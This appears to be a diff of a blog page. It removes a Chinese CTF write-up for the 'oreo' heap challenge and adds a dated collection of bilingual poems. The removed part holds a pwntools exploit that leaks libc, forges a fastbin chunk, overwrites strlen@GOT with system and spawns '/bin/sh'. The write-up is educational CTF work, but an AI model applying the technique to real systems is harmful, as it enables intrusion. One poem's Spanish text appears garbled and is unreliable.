*(&amp;v2-&gt;field_20 + <span class="number">2</span>);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    heap_bss = <span class="number">0</span>;</span><br><span class="line">    ++order_num;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Okay order submitted!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No rifles to be ordered!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="leave-message"><a href="#leave-message" class="headerlink" title="leave_message"></a>leave_message</h4><p>这里有任意写的一个机会。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">leave_message</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v0 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter any notice you&#x27;d like to submit with your order: &quot;</span>);</span><br><span class="line">  fgets(message, <span class="number">128</span>, <span class="built_in">stdin</span>);                   <span class="comment">// message处有一个指针指向另一块区域，留言的数据在那。如果修改此指针可达到任意写效果。</span></span><br><span class="line">  vul(message);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>还一个函数没啥用，不多说了。</p>
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>这里我不想太可以去说是利用了些什么方式来拿shell（<del>因为我说不清楚</del>），直接看思路吧。</p>
-<blockquote>
-<p>step1：通过show函数来泄露出Libc基址。</p>
-<p>step2：通过add函数在bss上构造出一个fake_chunk。</p>
-<p>step3：通过leave_message函数和add函数中野联动来达到任意地址写效果。这里是把strlen改写为system</p>
-<p>step4：通过leave_message函数来实现system(system;&#x2F;bin&#x2F;sh)&#x3D;system(system) + system(&#x2F;bin&#x2F;sh)成功get_shell。</p>
-</blockquote>
-<h4 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h4><p>注意一个小细节，为什么是接受两次<code>Description: </code>，在程序添加第一个chunk后，因为前面没有其他的chunk了，所以<code>data+0x34</code>处的地址是<code>\x00</code>，我们把这里覆盖为<code>puts.got</code>的地址就会造成前面还有chunk的假象，第二次输出的前4位（32位程序）正是puts的真实地址。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="number">27</span> * <span class="string">&#x27;a&#x27;</span> + p32(oreo.got[<span class="string">&#x27;puts&#x27;</span>]) </span><br><span class="line">add(<span class="number">20</span> * <span class="string">&#x27;a&#x27;</span>, name)</span><br><span class="line">show_rifle()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
-<h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>注意看下面的几个变量，其相差均为<code>0x4</code>，如果可以控制对应的数据，那么就可以在bss上伪造出一个chunk，再利用上一步用到的覆盖chunk末尾的指针，则可以实现在bss上malloc</p>
-<p>具体实现就是，add_num会记录程序add的chunk块，我们add个0x40此就可以把add_num作为chunk的size了。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A2A0 order_num       dd ?                    ; DATA XREF: delete+5A↑r</span><br><span class="line">.bss:0804A2A0                                         ; delete+62↑w ...</span><br><span class="line">.bss:0804A2A4 add_num         dd ?                    ; DATA XREF: add+C5↑r</span><br><span class="line">.bss:0804A2A4                                         ; add+CD↑w ...</span><br><span class="line">.bss:0804A2A8 ; char *message</span><br><span class="line">.bss:0804A2A8 message         dd ?                    ; DATA XREF: leave_message+23↑r</span><br><span class="line">.bss:0804A2A8                                         ; leave_message+3C↑r ...</span><br><span class="line">.bss:0804A2AC                 align 20h</span><br><span class="line">.bss:0804A2C0 unk_804A2C0     db    ? ;               ; DATA XREF: main+29↑o</span><br><span class="line">.bss:0804A2C1                 db    ? ;</span><br><span class="line">.bss:0804A2C2                 db    ? ;</span><br><span class="line">.bss:0804A2C3                 db    ? ;</span><br><span class="line">.bss:0804A2C4                 db    ? ;</span><br><span class="line">.bss:0804A2C5                 db    ? ;</span><br><span class="line">.bss:0804A2C6                 db    ? ;</span><br><span class="line">.bss:0804A2C7                 db    ? ;</span><br><span class="line">.bss:0804A2C8                 db    ? ;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">oifle = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> oifle &lt; <span class="number">0x3f</span>:</span><br><span class="line">        <span class="comment"># set next link=NULL</span></span><br><span class="line">        add(<span class="number">25</span> * <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">27</span> + p32(<span class="number">0</span>))</span><br><span class="line">        oifle += <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h4><p>这里我觉得算是整个程序我最难理解的一部分吧</p>
-<p>上面说到为了使add_num达到0x40要add</p>
-<p>这里首先使构造这0x40个chunk的最后一个chunk</p>
-<p><strong>把chunk的指针（data+0x34）指到bss段上</strong>，这里是0x804a2a8</p>
-<p>然后leave_message留言使data+0x34的部分为”\x00“，这里就是让我裂开的地方，我觉得覆盖到0xe0前面就行了，但事实是，不行。</p>
-<p>这里是真的把我给看傻了，ctf-wiki在该fake_chunk后又构造了一个chunk，我不知道目的是什么，经过测试不构造这个也可以，但是必须要填充至少0x25个数据上去。为什么呢，为什么呢，为什么呢，我他妈裂开。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40wx 0x0804A2A0</span><br><span class="line">0x804a2a0:	0x00000000	0x00000040	0x0804a2c0	0x00000000</span><br><span class="line">0x804a2b0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2c0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2d0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2e0:	0x00000000	0x00000a61	0x00000000	0x00000000</span><br><span class="line">0x804a2f0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
-
-<p>然后就是order来ferr掉我们伪造的chunk，这样下次分配的时候就会分配到我们伪造的这个chunk上。</p>
-<p><strong>分配的时候把0x804a2a8的位置重写为strlen函数的got表位置</strong>，再次leave_message的时候，会直接通过0x804a2a8跳转到strlen.got上，这样就达到了修改got表的目的。</p>
-<p>为什么是strlen这个函数呢，因为在leave_message完之后（其实add中两次fgets也一样），会调用vul()函数来对输入进行一个判断，其中会有strlen()函数。其中strlen函数的参数在这里是bss上message的地址，而该地址的值又是另一个地址，如果最终的值是“\bin\sh”，在strlen被改为system的情况下，<strong>最终效果就是通过strlen(bss_heap)来实现system(“&#x2F;bin&#x2F;sh”)的效果</strong>。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">leave_message</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v0 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter any notice you&#x27;d like to submit with your order: &quot;</span>);</span><br><span class="line">  fgets(message, <span class="number">128</span>, <span class="built_in">stdin</span>);                   <span class="comment">// message处有一个指针指向另一块区域，留言的数据在那。如果修改此指针可达到任意写效果。</span></span><br><span class="line">  vul(message);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">vul</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *heap_25)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(heap_25) - <span class="number">1</span>;   <span class="comment">//就是利用这一行来实现get_shell，我这里修改结构体没改好有点难看。</span></span><br><span class="line">  v3 = &amp;heap_25[v1];</span><br><span class="line">  <span class="keyword">if</span> ( &amp;heap_25[v1] &gt;= heap_25 &amp;&amp; *v3 == <span class="number">10</span> )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">27</span> + p32(<span class="number">0x0804a2a8</span>)</span><br><span class="line">   <span class="comment"># set next link=0x0804A2A8, try to free a fake chunk</span></span><br><span class="line">   add(<span class="number">25</span> * <span class="string">&#x27;a&#x27;</span>, payload)</span><br><span class="line">   <span class="comment"># before free, we need to bypass some check</span></span><br><span class="line">   <span class="comment"># fake chunk&#x27;s size is 0x40</span></span><br><span class="line">   <span class="comment"># 0x20 *&#x27;a&#x27; for padding the last fake chunk</span></span><br><span class="line">   <span class="comment"># 0x40 for fake chunk&#x27;s next chunk&#x27;s prev_size</span></span><br><span class="line">   <span class="comment"># 0x100 for fake chunk&#x27;s next chunk&#x27;s size</span></span><br><span class="line">   <span class="comment"># set fake iofle&#x27; next to be NULL</span></span><br><span class="line">   payload = <span class="number">0x24</span> * <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span>  </span><br><span class="line">   <span class="comment">#+ p32(0x60)</span></span><br><span class="line">   <span class="comment">#payload = payload.ljust(52, &#x27;b&#x27;)</span></span><br><span class="line">   <span class="comment">#payload += p32(0)</span></span><br><span class="line">   <span class="comment">#payload = payload.ljust(128, &#x27;c&#x27;)</span></span><br><span class="line">   message(payload)</span><br><span class="line">   <span class="comment"># fastbin 0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL</span></span><br><span class="line">   <span class="comment">#gdb.attach(p)</span></span><br><span class="line">   <span class="comment">#p.interactive()</span></span><br><span class="line">   order()</span><br><span class="line">payload = p32(oreo.got[<span class="string">&#x27;strlen&#x27;</span>]).ljust(<span class="number">20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">   add(payload, <span class="string">&#x27;b&#x27;</span> * <span class="number">20</span>)</span><br></pre></td></tr></table></figure>
-
-<h4 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h4><p>这里是一个小细节，因为strlen的参数bss_heap也指向了strlen的got表。</p>
-<p>但是注意<code>;</code>可以分割命令，所以<code>system(&quot;system;/bin/sh&quot;) = system(&quot;system&quot;) + system(&quot;/bin/sh&quot;)</code></p>
-<p>system(“system”)不能正确执行，所以最后只剩system(“&#x2F;bin&#x2F;sh”)了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">message(p32(system_addr) + <span class="string">&#x27;;/bin/sh\x00&#x27;</span>)    </span><br><span class="line">   p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#fastbin-attack">Fastbin Attack</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85357">【技术分享】堆之House of Spirit</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaoi123/article/details/81482385">House of Spirit学习调试验证与实践</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29343201/article/details/59477082">linux 堆溢出学习之house of spirit(1) malloc maleficarum hos翻译</a></p>
-<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>怎么说呢，被一道并不算难，甚至可以说是简单？的题目卡了两三天还是挺让人沮丧的，眼看上海赛已经迫在眉睫了自己进展却是如此缓慢。做逆向的时候学如嚼蜡进度如乌龟爬，被pwn所吸引之后却又感觉时间是如此的不够用，如果……</p>
-<p>没有什么如果啦，归根结底还是自己太懒了不够努力</p>
-<p>2020马上就要结束了，这并不是很美好的一年，疫情，山火、蝗灾、川皇落选……一切都让2020充满了魔幻色彩。临近的尾声的2020也不让人消停，岁末赛出题加上猝不及防的上海赛都让我倍感压力，但看看周围其他同学，谁又不是顶着压力前行呢，保研的希望稳住最后的考试，实习的忙着准备面试，打学科竞赛的更是夜以继日的学，大伙都在努力冲冲冲呢。</p>
-<p>未哭过长夜者，不足以语人生，希望在走过这些无人问津的孤独旅程后，我们都能迎来一个更好的2021年，以及之后的每一年！( ｀・∀・´)ﾉﾖﾛｼｸ</p>
+<h3 id="Here-I-Love-You-5-25"><a href="#Here-I-Love-You-5-25" class="headerlink" title="Here I Love You - - - 5.25"></a>Here I Love You - - - 5.25</h3><hr>
+<p>Here I love you.</p>
+<p>In the dark pines the wind disentangles itself.</p>
+<p>The moon glows like phosphorus on the vagrant waters.</p>
+<p>Days, all one kind, go chasing each other.</p>
+<p>The snow unfurls in dancing figures.</p>
+<p>A silver gull slips down from the west.</p>
+<p>Sometimes a sail. High, high stars.</p>
+<p>Oh the black cross of a ship.</p>
+<p>Alone.</p>
+<p>Sometimes I get up early and my soul is wet.</p>
+<p>Far away the sea sounds and resounds.</p>
+<p>This is a port.</p>
+<p>Here I love you.</p>
+<p>Here I love you and the horizon hides you in vain.</p>
+<p>I love you still among these cold things.</p>
+<p>Sometimes my kisses go on those heavy vessels</p>
+<p>that cross the sea towards no arrival.</p>
+<p>I see myself forgotten like those old anchors.</p>
+<p>The piers sadden when the afternoon moors there.</p>
+<p>My life grows tired, hungry to no purpose.</p>
+<p>I love what I do not have. You are so far.</p>
+<p>My loathing wrestles with the slow twilights.</p>
+<p>But night comes on and starts to sing to me.</p>
+<p>The moon turns its clockwork dream.</p>
+<p>The biggest stars look at me with your eyes.</p>
+<p>And as I love you, the pines in the wind</p>
+<p>want to sing your name with their leaves of wire. </p>
+<p>在此我爱你。<br>风在幽暗的松林里解开自己。<br>月亮在游荡的水上发出磷光。<br>同样的日子相互追逐纠缠。</p>
+<p>雾气散开成舞蹈的形体。<br>一只银色的海鸥从西天滑落。<br>有时一片帆。高高，高高在上的星星。</p>
+<p>或者一条船的黑色十字。<br>孤独的。<br>有时清晨醒来，连我的灵魂也是湿的。<br>海远远地发声，又发声。<br>这是港口。<br>在此我爱你。</p>
+<p>在此我爱你，而地平线徒劳地将你遮掩。<br>置身这些冰冷的东西中我依然爱你。<br>有时我的吻登上那些沉重的船只<br>由海上驶向无法到达的地方。<br>我看见自己如那些旧锚般被遗忘。<br>当黄昏靠岸，码头格外悲伤。<br>我的生命已倦，毫无成效的饥饿。<br>我爱我没有的东西。你如此遥远。<br>我的厌烦与缓慢的暮色搏斗着。<br>但夜来临，并开始对我歌唱。</p>
+<p>月亮转动它梦的圆盘。<br>最大的那些星星藉你的眼睛望着我。<br>而因为我爱你，风中的松树<br>要用它们的针叶歌唱你的名。</p>
+<h3 id="微风从我这里经过-6-1"><a href="#微风从我这里经过-6-1" class="headerlink" title="微风从我这里经过 - - - 6.1"></a>微风从我这里经过 - - - 6.1</h3><hr>
+<p>允许我沉醉，允许我哭泣，允许我在这么远的地方<br>把爱情掏出来。如掏一丛夜来香<br>面临星光的时候，面临深渊</p>
+<p>我一直是个怀揣泥土的人，遇见你<br>它就有了瓷的模样<br>却没有人来告诉我每一条路都是晴朗</p>
+<p>比你易跌倒，比你易破碎<br>作为一个贩卖月光和人间的人<br>我允许你，笑话我</p>
+<p>如果哪一个早晨醒来，找不到彼此<br>只有微风吹过<br>一定要微笑，无论记得还是遗忘</p>
+<h3 id="偶然-6-2"><a href="#偶然-6-2" class="headerlink" title="偶然 - - - 6.2"></a>偶然 - - - 6.2</h3><hr>
+<p>我是天空里的一片云，<br>偶尔投影在你的波心──<br>你不必讶异，<br>更无须欢喜──<br>在转瞬间消灭了踪影。</p>
+<p>你我相逢在黑夜的海上，<br>你有你的，我有我的，方向；<br>你记得也好，<br>最好你忘掉<br>在这交会时互放的光亮！</p>
+<h3 id="山中雪后-6-4"><a href="#山中雪后-6-4" class="headerlink" title="山中雪后 - - - 6.4"></a>山中雪后 - - - 6.4</h3><hr>
+<p>晨起开门雪满山，雪晴云淡日光寒。<br>檐流未滴梅花冻，一种清孤不等闲。</p>
+<h3 id="一本书-6-5"><a href="#一本书-6-5" class="headerlink" title="一本书 - - - 6.5"></a>一本书 - - - 6.5</h3><hr>
+<p>There is no frigate like a book<br>To take us lands away,<br>Nor any coursers like a page<br>Of prancing poetry.<br>This traverse may the poorest take<br>Without oppress of toll;<br>How frugal is the chariot<br>That bears a human soul !</p>
+<p>没有一艘舰船<br>能像一本书<br>带我们遨游远方</p>
+<p>没有一匹骏马<br>能像一页诗行<br>如此欢跃飞扬</p>
+<p>即使一贫如洗<br>它也可以带你走上<br>无须路费的旅程</p>
+<p>这辆战车，朴素无华<br>却载着人类的灵魂</p>
+<h3 id="我用什么才能留住你-6-6"><a href="#我用什么才能留住你-6-6" class="headerlink" title="我用什么才能留住你 - - - 6.6"></a>我用什么才能留住你 - - - 6.6</h3><hr>
+<p>Voy a dar usted se inclina fuera de las calles, ocasos desesperados, la luna del desierto.</p>
+<p>Te voy a dar un largo rato mirando la gran tragedia de los meses en solitario. La primera alma te voy a dar mis muertos, las personas rinden homenaje al mármol: el padre de mi padre, fue asesinado en la frontera de Buenos Aires, dos balas le atravesóbai el pecho cuando él murió, luciendo una larga barba, los cuerpos eran soldados con envoltura de cuero de la, el abuelo de mi madre - de ese año, de 24 años de edad - llevado en el Perú, a 300 personas a cargo, los espíritus de los muertos se han convertido desapareció el caballo.</p>
+<p>El Wuli contiene todo lo que yo pueda darle mi libro y mi vida que pueden ser algunas machismo y el humor. Te voy a dar un nunca tuvo la lealtad de las personas de fe.</p>
+<p>Te voy a dar mi propia me las arreglé para preservar el núcleo - no frases de palabras del campo, y el sueño de las transacciones, el tiempo, la alegría y la adversidad toca el núcleo. Te voy a dar vuelta antes de que nacieras muchos años de una noche para ver una rosa amarilla de la memoria. </p>
+<p>Te voy a dar la interpretación de su vida en su propia teoría, su presencia verdadera y sorprendente. </p>
+<p>Te voy a dar mi soledad, mi oscuridad, mi corazón está con hambre; He intentado utilizar la confusión, el peligro, no le sorprenderá</p>
+<p>我用什么才能留住你？<br>我给你瘦落的街道、绝望的落日、荒郊的月亮。<br>我给你一个久久地望着孤月的人的悲哀。 </p>
+<p>我给你我已死去的祖辈，<br>后人们用大理石祭奠的先魂：<br>我父亲的父亲，<br>阵亡于布宜诺斯艾利斯的边境，<br>两颗子弹射穿了他的胸膛，<br>死的时候蓄着胡子，<br>尸体被士兵们用牛皮裹起；</p>
+<p>我母亲的祖父——那年才二十四岁——在秘鲁率领三百人冲锋，<br>如今都成了消失的马背上的亡魂。 </p>
+<p>我给你我的书中所能蕴含的一切悟力，<br>以及我生活中所能有的男子气概和幽默。<br>我给你一个从未有过信仰的人的忠诚。</p>
+<p>我给你我设法保全的我自己的核心——不营字造句，不和梦交易，不被时间、欢乐和逆境触动的核心。 </p>
+<p>我给你早在你出生前多年的一个傍晚看到的一朵黄玫瑰的记忆。<br>我给你关于你生命的诠释，<br>关于你自己的理论，<br>你的真实而惊人的存在。 </p>
+<p>我给你我的寂寞、我的黑暗、我心的饥渴；<br>我试图用困惑、危险、失败来打动你。 </p>
+<h3 id="九月-6-11"><a href="#九月-6-11" class="headerlink" title="九月 - - - 6.11"></a>九月 - - - 6.11</h3><hr>
+<p>目击众神死亡的草原上野花一片<br>远在远方的风比远方更远<br>我的琴声呜咽 泪水全无<br>我把这远方的远归还草原<br>一个叫木头 一个叫马尾<br>我的琴声呜咽 泪水全无</p>
+<p>远方只有在死亡中凝聚野花一片<br>明月如镜 高悬草原 映照千年岁月<br>我的琴声呜咽 泪水全无<br>只身打马过草原</p>
+<h3 id="活在这珍贵的人间-6-14"><a href="#活在这珍贵的人间-6-14" class="headerlink" title="活在这珍贵的人间 - - - 6.14"></a>活在这珍贵的人间 - - - 6.14</h3><hr>
+<p>活在这珍贵的人间</p>
+<p>太阳强烈</p>
+<p>水波温柔</p>
+<p>一层层白云覆盖着</p>
+<p>我踩在青草上</p>
+<p>感到自己是彻底干净的黑土块</p>
+<p>活在这珍贵的人间</p>
+<p>泥土高溅</p>
+<p>扑打面颊</p>
+<p>活在这珍贵的人间</p>
+<p>人类和植物一样幸福</p>
+<p>爱情和雨水一样幸福</p>
+<h3 id="夏天的太阳-6-14"><a href="#夏天的太阳-6-14" class="headerlink" title="夏天的太阳 - - - 6.14"></a>夏天的太阳 - - - 6.14</h3><hr>
+<p>夏天</p>
+<p>如果这条街没有鞋匠</p>
+<p>我就打着赤脚</p>
+<p>站在太阳下看太阳</p>
+<p>我想到在白天出生的孩子</p>
+<p>一定是出于故意</p>
+<p>你来人间一趟</p>
+<p>你要看看太阳</p>
+<p>和你的心上人</p>
+<p>一起走在街上</p>
+<p>了解她</p>
+<p>也要了解太阳</p>
+<p>夏天的太阳</p>
+<p>太阳</p>
+<p>当年基督入世</p>
+<p>也在这太阳下长大</p>
+<h3 id="回答-6-17"><a href="#回答-6-17" class="headerlink" title="回答 - - - 6.17"></a>回答 - - - 6.17</h3><hr>
+<p>卑鄙是卑鄙者的通行证，<br>高尚是高尚者的墓志铭，<br>看吧，在那镀金的天空中，<br>飘满了死者弯曲的倒影。</p>
+<p>冰川纪过去了，<br>为什么到处都是冰凌？<br>好望角发现了，<br>为什么死海里千帆相竞？</p>
+<p>我来到这个世界上，<br>只带着纸、绳索和身影，<br>为了在审判之前，<br>宣读那些被判决的声音。</p>
+<p>告诉你吧，世界<br>我–不–相–信！<br>纵使你脚下有一千名挑战者，<br>那就把我算作第一千零一名。</p>
+<p>我不相信天是蓝的，<br>我不相信雷的回声，<br>我不相信梦是假的，<br>我不相信死无报应。</p>
+<p>如果海洋注定要决堤，<br>就让所有的苦水都注入我心中，<br>如果陆地注定要上升，<br>就让人类重新选择生存的峰顶。</p>
+<p>新的转机和闪闪星斗，<br>正在缀满没有遮拦的天空。<br>那是五千年的象形文字，<br>那是未来人们凝视的眼睛。</p>
+<h3 id="门前-6-23"><a href="#门前-6-23" class="headerlink" title="门前 - - - 6.23"></a>门前 - - - 6.23</h3><hr>
+<p>我多么希望，有一个门口</p>
+<p>早晨，阳光照在草上</p>
+<p>我们站着</p>
+<p>扶着自己的门扇</p>
+<p>门很低，但太阳是明亮的</p>
+<p>草在结它的种子</p>
+<p>风在摇它的叶子</p>
+<p>我们站着，不说话</p>
+<p>就十分美好</p>
+<p>有门，不用开开</p>
+<p>是我们的，就十分美好</p>
+<p>早晨，黑夜还要流浪</p>
+<p>我们把六弦琴交给他</p>
+<p>我们不走了</p>
+<p>我们需要土地</p>
+<p>需要永不毁灭的土地</p>
+<p>我们要乘着它</p>
+<p>度过一生</p>
+<p>土地是粗糙的，有时狭隘</p>
+<p>然而，它有历史</p>
+<p>有一份天空，一份月亮</p>
+<p>一份露水和早晨</p>
+<p>我们爱土地</p>
+<p>我们站着</p>
+<p>用木鞋挖着泥土</p>
+<p>门也晒热了</p>
+<p>我们轻轻靠着，十分美好</p>
+<p>墙后的草</p>
+<p>不会再长大了</p>
+<p>它只用指尖，触了触阳光</p>
+<h3 id="西江月·世事一场大梦-6-25"><a href="#西江月·世事一场大梦-6-25" class="headerlink" title="西江月·世事一场大梦 - - - 6.25"></a>西江月·世事一场大梦 - - - 6.25</h3><hr>
+<p>世事一场大梦，人生几度秋凉。夜来风叶已鸣廊。看取眉头鬓上。</p>
+<p>酒贱常愁客少，月明多被云妨。中秋谁与共孤光。把盏凄然北望。</p>
+<h3 id="避免-8-9"><a href="#避免-8-9" class="headerlink" title="避免 - - - 8.9"></a>避免 - - - 8.9</h3><hr>
+<p>你说</p>
+<p>你不愿种花</p>
+<p>因为你不愿看见花</p>
+<p>一点点的凋落</p>
+<p>是的</p>
+<p>为了避免一切的结束</p>
+<p>你拒绝了所有的开始</p>
+<h3 id="乌夜啼·昨夜风兼雨-10-28"><a href="#乌夜啼·昨夜风兼雨-10-28" class="headerlink" title="乌夜啼·昨夜风兼雨 - - - 10.28"></a>乌夜啼·昨夜风兼雨 - - - 10.28</h3><hr>
+<p>昨夜风兼雨，帘帏飒飒秋声。烛残漏断频欹枕，起坐不能平。</p>
+<p>世事漫随流水，算来一梦浮生。醉乡路稳宜频到，此外不堪行。</p>
+<h3 id="一剪梅·红藕香残玉簟秋-10-29"><a href="#一剪梅·红藕香残玉簟秋-10-29" class="headerlink" title="一剪梅·红藕香残玉簟秋 - - - 10.29"></a>一剪梅·红藕香残玉簟秋 - - - 10.29</h3><hr>
+<p>红藕香残玉簟秋。轻解罗裳，独上兰舟。云中谁寄锦书来，雁字回时，月满西楼。</p>
+<p>花自飘零水自流。一种相思，两处闲愁。此情无计可消除，才下眉头，却上心头。</p>
+<h3 id="Seven-times-have-I-despised-my-soul-11-5"><a href="#Seven-times-have-I-despised-my-soul-11-5" class="headerlink" title="Seven times have I despised my soul - - - 11.5"></a>Seven times have I despised my soul - - - 11.5</h3><hr>
+<p>The first time when I saw her being meek that she might attain height.</p>
+<p>The second time when I saw her limping before the crippled.</p>
+<p>The third time when she was given to choose between the hard and the easy, and she chose the easy.</p>
+<p>The fourth time when she committed a wrong, and comforted herself that others also commit wrong.</p>
+<p>The fifth time when she forbore for weakness, and attributed her patience to strength.</p>
+<p>The sixth time when she despised the ugliness of a face, and knew not that it was one of her own masks.</p>
+<p>And the seventh time when she sang a song of praise, and deemed it a virtue. </p>
